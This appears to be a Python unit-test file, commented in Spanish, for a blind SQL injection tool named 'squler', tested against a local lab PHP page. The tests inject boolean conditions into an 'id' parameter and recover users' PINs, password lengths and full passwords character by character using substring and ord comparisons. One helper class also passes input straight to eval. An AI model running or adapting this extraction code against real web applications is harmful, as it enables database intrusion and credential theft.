#!/usr/bin/env python
#-*- coding: utf8 -*-

import unittest
import squler
import re
from urllib import urlopen, urlencode

class NoSQL(squler.QueryHandler):
	""" No se usa ninguna SQL Injection, la expresión de evalua en Python """
	def __init__(self, n, rango = None):
		if rango is None:
			rango = [0,65535]
		self.n = n # El número a adivinar
		self.rango = rango #Lista que indica el mínimo y máximo valor. Variable
	def query(self, data):
		if re.match('^=[0-9]+$', data):
			# Si se está comparando si es igual a un número
			data = '=' + data # Para que no haya error de sintaxis
		return eval('self.n %s' % data)

class Localhost(squler.QueryHandler):
	""" El manejador de querys de un server de prueba """
	def __init__(self, uid, field):
		self.uid = uid # El ID del usuario
		self.field = field # El campo cuyo valor se quiere adivinar
	def query(self, data):
		url = "http://192.168.2.102/public/sqli.php"
		q = "%s AND %s %s" % (self.uid, self.field, data)
		url = url + '?' + urlencode(dict(id=q))
		pag = urlopen(url).read()
		if "No hay resultados" in pag:
			return False
		else:
			return True

class TestMain(unittest.TestCase):
	def test_clase_correcta(self):
		""" La clase tiene que ser instancia de QueryHandler o una que herede
		de esta """
		handlers = [Localhost(1,'password'), NoSQL(1732)]
		for handler in handlers:
			self.assertTrue(isinstance(handler, squler.QueryHandler))

	def test_localhost_querys(self):
		""" Verifica que las querys funcionen bien en localhost """
		handler = Localhost(1,'pin')
		self.assertTrue(handler.query('=1204'))
		self.assertFalse(handler.query('=12345'))
		self.assertFalse(handler.query('!=1204'))

	def test_nosql_querys(self):
		""" Verifica que NoSQL funcione bien """
		handler = NoSQL(1732)
		self.assertTrue(handler.query('=1732'))
		self.assertTrue(handler.query('<1733'))
		self.assertTrue(handler.query('>1731'))

	def test_adivina(self):
		""" Verifica que la función adivinaint funcione correctamene """
		handlers = [NoSQL(1,[0,1]), NoSQL(7365), NoSQL(128,[0,255])]
		for handler in handlers:
				self.assertEqual(squler.adivinaint(handler,handler.rango),
								handler.n)

		# Probamos que raisee ValueError si le pasamos un rango equivocado
		handler = NoSQL(100,[10,20])
		with self.assertRaises(ValueError):
			squler.adivinaint(handler,handler.rango)

	def test_adivina_pin(self):
			""" Intenta adivinar el pin de los usuarios con id 1 y 2.
			Los resultados esperados son 1204 y 12345, respectivamente"""
			tests = (Localhost(1,'pin'), 1204), \
				  (Localhost(2,'pin'), 12345) # el campo pin es SMALLINT
			for handler, val in tests:
					self.assertEqual(squler.adivinaint(handler,[-32768, 32767]),
									 val)

	def test_adivina_length(self):
			""" Intenta adivinar la longitud de las contraseñas de los usuarios
			con id 1 y 2 """
			tests = (1,len('secret')), (2,len('secret2'))
			for uid, esperado in tests:
					handler = Localhost(uid, 'length(password)')
					self.assertEqual(squler.adivinaint(handler, [0,50]),\
									esperado)
	
	def test_adivina_password_manual(self):
			""" Adivina las contraseñas sin usar adivinastr """
			tests = (1,'secret'),(2,'secret2')
			for uid, esperado in tests:
				# Primero calculamos la longitud
				length = squler.adivinaint(Localhost(uid,\
								'length(password)'),[0,50])

				# Adivinamos caracter por caracter
				result = ''
				for i in range(1, length + 1):
					handler = Localhost(uid, 'ord(substring(password,%s,1))'%i)
					char = chr(squler.adivinaint(handler,[0,255]))
					result += char
				self.assertEqual(result,esperado)

if __name__ == '__main__':
	unittest.main()
